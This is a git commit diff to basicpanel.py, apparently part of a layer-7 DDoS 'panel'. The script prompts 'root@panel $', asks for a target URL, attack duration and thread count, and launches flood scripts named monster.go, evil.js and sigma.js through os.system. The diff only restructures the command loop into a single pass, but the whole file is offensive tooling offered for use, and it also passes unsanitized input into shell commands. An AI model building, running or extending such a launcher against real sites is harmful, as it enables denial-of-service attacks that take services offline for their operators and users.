d0aa754979b4654e0d888f60fb09bcd94223e3d7
nwhsecurity <146524247+nwhsecurity@users.noreply.github.com>
2023-09-30 02:34:03 -0700

    Update basicpanel.py

--- basicpanel.py
+++ basicpanel.py
@@ -24,35 +24,30 @@ sigma
 """
 print(methodsl7)
 
-while True:
-    cnc = input("root@panel $ ")
+cnc = input("root@panel $ ")
 
-    if "monster" in cnc:
-        try:
-            url = input("Enter the Target URL: ")
-            method = cnc.split()[2]
-            os.system(f'go run monster.go -site {url}')
-        except IndexError:
-            print('Install Go Lang in your system')
+if "monster" in cnc:
+    try:
+        url = input("Enter the Target URL: ")
+        os.system(f'go run monster.go -site {url}')
+    except :
+        print('Install Go Lang in your system')
 
-    elif "evil" in cnc:
-        try:
-            url = input('Enter the Target URL: ')
-            time = input('Enter time in seconds: ')
-            os.system(f'node evil.js {url} {time}')
-        except IndexError:
-            print('Install Node.js in your system')
+elif "evil" in cnc:
+    try:
+        url = input('Enter the Target URL: ')
+        time = input('Enter time in seconds: ')
+        os.system(f'node evil.js {url} {time}')
+    except IndexError:
+        print('Install Node.js in your system')
 
-    elif cnc == "exit":
-        break  # Exit the loop if the user enters "exit"
+else:
+    try:
+        url = input('Enter the Target URL: ')
+        time = input('Enter the Time in seconds: ')
+        per = input('Enter the threads: ')
+        os.system(f'node sigma.js {url} {time} {per} uam.txt')
+    except IndexError:
+        print('Install Node.js in your system')
 
-    else:
-        try:
-            url = input('Enter the Target URL: ')
-            time = input('Enter the Time in seconds: ')
-            per = input('Enter the threads: ')
-            os.system(f'node sigma.js {url} {time} {per} uam.txt')
-        except IndexError:
-            print('Install Node.js in your system')
-
-print("Exiting the panel.")
+input("root@panel $ ")
